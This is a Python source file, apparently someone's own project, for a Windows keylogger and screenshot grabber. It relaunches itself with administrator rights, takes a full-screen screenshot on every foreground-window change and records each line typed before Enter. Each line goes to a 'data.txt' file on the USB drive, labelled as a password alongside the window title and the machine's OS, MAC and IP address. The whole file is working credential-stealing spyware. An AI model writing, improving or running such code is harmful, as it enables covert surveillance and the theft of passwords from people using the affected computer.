# -*- coding: utf-8 -*-
"""
Created on Wed Apr 22 14:00:13 2026
@author: camtr
"""

"""
Key‑logger + screenshot grabber (Windows only, needs admin).
Dependencies (install once):
    pip install keyboard mss pillow pywin32 netifaces
"""

import os
import socket
import sys
import time
import traceback
import threading
from datetime import datetime
import ctypes
import ctypes.wintypes as wintypes
import keyboard
import mss
import mss.tools
import win32gui
import platform
import uuid
try:
    import netifaces          
except Exception:            
    netifaces = None

# ADMIN CHECK & AUTO‑RESTART

def is_admin() -> bool:
    """Return True if the current process has administrative rights."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def run_as_admin(argv=None):
    """Re‑launch the current script with elevated rights."""
    if argv is None:
        argv = sys.argv
    script_path = os.path.abspath(argv[0])
    params = " ".join(f'"{arg}"' for arg in argv[1:])
    try:
        ret = ctypes.windll.shell32.ShellExecuteW(
            None,          # hwnd
            "runas",       # verb
            sys.executable,  # python.exe
            f'"{script_path}" {params}',
            None,          # directory
            1              # SW_SHOWNORMAL
        )
        if ret <= 32:
            raise ctypes.WinError(ret)
    except Exception as e:
        print("Could not elevate:", e)
        sys.exit(1)


if not is_admin():
    print("[INFO] Script is not running as administrator – relaunching …")
    run_as_admin()
    sys.exit(0)

# NEW HELPER – writes the launch‑info header to *both* console & file

def write_launch_info(file_obj):
    """
    Builds a single line containing OS, MAC, and IP.
    The line is printed to stdout **and** appended to the opened file object.
    """
    # ----  OS 
    os_name   = platform.system()
    os_version = platform.version()
    os_release = platform.release()

    # ----  MAC 
    mac_int = uuid.getnode()
    # convert the 48‑bit integer into the normal 00:1A:2B:… format
    mac_str = ':'.join(f'{(mac_int >> ele) & 0xFF:02X}' for ele in range(0, 48, 8))[::-1]

    # ----  IP 
    ip_addr = None

    # Try netifaces
    
    if netifaces:
        try:
            for iface in netifaces.interfaces():
                for addr in netifaces.ifaddresses(iface).get(netifaces.AF_INET, []):
                    ip = addr.get('addr')
                    if ip and not ip.startswith('127.'):
                        ip_addr = ip
                        break
                if ip_addr:
                    break
        except Exception:
            pass

    # If still None, fall back to socket
    if not ip_addr:
        try:
            for res in socket.getaddrinfo(socket.gethostname(), None):
                if res[0] == socket.AF_INET:            # IPv4 only
                    ip = res[4][0]
                    if not ip.startswith('127.'):
                        ip_addr = ip
                        break
            if not ip_addr:
                ip_addr = socket.gethostbyname(socket.gethostname())
                if ip_addr.startswith('127.'):
                    ip_addr = None
        except Exception:
            pass

    if not ip_addr:
        ip_addr = '127.0.0.1'
    launch_line = (
        f"[LAUNCH] OS: {os_name} {os_version} (release {os_release}) | "
        f"MAC: {mac_str} | IP: {ip_addr}\n"
    )

    print(launch_line.strip())

    file_obj.write(launch_line)


# INITIAL SETUP – directories, screenshot folder (unchanged)

USB_ROOT = os.path.abspath(os.path.dirname(sys.argv[0]))
SCREENSHOT_DIR = os.path.join(USB_ROOT, "Screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
print(f"[INFO] Screenshots will be stored in: {SCREENSHOT_DIR}")

# HOOK CALLBACK (unchanged – screenshot logic)

WinEventProc = ctypes.WINFUNCTYPE(
    None,                     # return type
    wintypes.HANDLE,          # hWinEventHook
    wintypes.UINT,            # event
    wintypes.HWND,            # hwnd
    wintypes.LONG,            # idObject
    wintypes.LONG,            # idChild
    wintypes.DWORD,           # idThread
    wintypes.DWORD            # idmsEventTime
)


def win_event_proc(hWinEventHook, event, hwnd, idObject, idChild, idThread, idmsEventTime):
    """Called every time the foreground window changes."""
    try:
        title = win32gui.GetWindowText(hwnd).strip() or "no_title"
        ts = time.strftime("%Y%m%d-%H%M%S")
        safe = "".join(c if c.isalnum() or c in " _-()" else "_" for c in title)
        filename = f"{ts}_{safe}.png"
        path = os.path.join(SCREENSHOT_DIR, filename)
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            img = sct.grab(monitor)
            mss.tools.to_png(img.rgb, img.size, output=path)
        print(f"[SCREENSHOT] {path}")
    except Exception:
        print("[ERROR] in win_event_proc")
        traceback.print_exc()


win_event_callback = WinEventProc(win_event_proc)

# HOOK INSTALLER THREAD (unchanged)

def hook_thread():
    """Thread that installs SetWinEventHook and runs a message loop."""
    hook_id = ctypes.windll.user32.SetWinEventHook(
        0x0003,          # EVENT_SYSTEM_FOREGROUND
        0x0003,          # EVENT_SYSTEM_FOREGROUND
        0,               # hmod (NULL)
        win_event_callback,  # LPFN
        0,               # idProcess (NULL – all processes)
        0,               # idThread  (NULL – all threads)
        0x0000           # WINEVENT_OUTOFCONTEXT
    )
    if not hook_id:
        print("[ERROR] SetWinEventHook failed")
        sys.exit(1)
    print(f"[INFO] Hook installed, id={hook_id}")

    # ----- message loop
    msg = wintypes.MSG()
    while True:
        if ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) == 0:
            break
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))


# Start the hook in the background (daemon so the process can exit cleanly)
threading.Thread(target=hook_thread, daemon=True).start()

# LOGGING LOOP

def key_logger():
    """Log every key typed in the console until the user presses ENTER."""
    DATA_PATH = os.path.join(USB_ROOT, "data.txt")

    with open(DATA_PATH, "a", encoding="utf-8") as f:
        write_launch_info(f)

    def active_window_title() -> str:
        """Return the title of the active window."""
        try:
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            return title or "Unnamed Window"
        except Exception:
            return get_active_window_title_ctypes()

    def get_active_window_title_ctypes() -> str:
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return "Unknown Window"
        length = user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return "Unnamed Window"
        buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buffer, length + 1)
        return buffer.value

    # ----  Main logging loop ----
    while True:
        # Record everything until ENTER is pressed
        events = keyboard.record("enter")
        typed_strings = list(keyboard.get_typed_strings(events))
        if not typed_strings:
            continue
        pwd = typed_strings[0]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        site_title = active_window_title()
        # Log a single line: <timestamp> | <site> | <password>
        with open(DATA_PATH, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} | {site_title} | {pwd}\n")
        print(f"[LOG] {timestamp} | {site_title} | {pwd}")

if __name__ == "__main__":
    key_logger()
